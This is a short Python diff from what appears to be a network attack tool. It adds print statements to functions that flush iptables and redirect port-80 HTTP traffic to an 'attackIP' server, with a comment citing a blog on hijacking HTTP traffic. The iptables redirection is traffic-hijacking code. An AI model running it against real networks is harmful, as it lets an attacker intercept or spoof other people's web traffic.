@@ -39,6 +39,7 @@ def enableIPForwarding():
 def setWebPage(interface, attackIP):
     #Iptable code (minor changes) comes from:
     #https://blogs.oracle.com/ksplice/entry/hijacking_http_traffic_on_your
+    print "Starting web server ", attackIP, ' on ', interface, '.'
     os.system('iptables -t nat --flush')
     os.system('iptables --zero')
     os.system('iptables -A FORWARD --in-interface %s -j ACCEPT' %interface)
@@ -48,6 +49,7 @@ def setWebPage(interface, attackIP):
           '--jump DNAT --to-destination %s' %attackIP)
 
 def killWebServer(attackIP):
+    print "Shutting down ", attackIP
     os.system('sudo iptables -t nat -D PREROUTING -p tcp --dport ' \
               '80 -j NETMAP --to %s' %attackIP)
     print "removing ip tables"
